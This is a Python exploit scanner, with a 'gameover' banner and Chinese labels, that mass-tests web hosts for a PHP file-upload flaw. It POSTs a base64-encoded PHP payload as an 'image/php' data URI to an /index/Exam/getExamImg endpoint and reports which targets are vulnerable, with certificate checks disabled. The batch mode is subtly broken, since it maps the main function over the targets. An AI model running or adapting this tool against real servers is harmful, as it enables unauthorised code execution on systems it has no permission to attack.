import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    banner = """
       _________    _____   ____  _______  __ ___________ 
      / ___\__  \  /     \_/ __ \/  _ \  \/ // __ \_  __ \
     / /_/  > __ \|  Y Y  \  ___(  <_> )   /\  ___/|  | \/
     \___  (____  /__|_|  /\___  >____/ \_/  \___  >__|   
    /_____/     \/      \/     \/                \/                                                                         

    """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    targets = []
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            check(f"http://{args.url}")
    elif args.file:
        with open(args.file,'r') as f:
            for target in f:
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    target = f"http://{target}"
                    targets.append(target)
    pool = Pool()
    pool.map(main, targets)


def check(target):
    url = f"{target}/index/Exam/getExamImg"
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept':'*/*',
        'Connection':'close',
    }
    data = """src_data=data:image/php;base64,PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4="""
    try:
        response = requests.post(url, headers=headers, data=data, verify=False,timeout=5)
        if response.status_code == 200 and 'upload' in response.text:
            print(f"{target}存在漏洞")
        else:
            print(f"{target}不存在漏洞")
    except Exception as e:
        pass

if __name__ == '__main__':
    main()